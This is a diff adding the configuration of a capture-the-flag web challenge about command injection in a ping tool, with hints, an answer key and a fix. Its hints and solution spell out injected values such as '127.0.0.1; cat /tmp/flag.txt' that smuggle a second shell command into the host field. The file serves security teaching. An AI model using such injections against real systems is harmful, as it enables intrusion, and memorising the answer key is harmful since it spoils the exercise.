@@ -1,0 +1,25 @@
+id: cmdi-ping
+title: Command Injection Ping Tool
+category: web
+difficulty: medium
+order: 30
+description: >-
+  A network tool runs ping with your input pasted into a shell command. Break out
+  of the command and read the flag file inside the container.
+image: cyberlab/challenge-cmdi-ping:latest
+container_port: 8000
+ttl_minutes: 30
+points: 150
+hints:
+  - The host field becomes part of a shell command.
+  - Chain commands with a semicolon, e.g. 127.0.0.1; id.
+  - The flag is at /tmp/flag.txt.
+solution: |
+  1. Submit the host value:
+       127.0.0.1; cat /tmp/flag.txt
+  2. The server runs: ping -c 1 127.0.0.1; cat /tmp/flag.txt
+     and returns the flag in the output.
+
+  Fix: never use a shell for user input. Pass an argument list:
+       subprocess.run(["ping", "-c", "1", host], shell=False)
+  and validate the host against a strict allowlist.
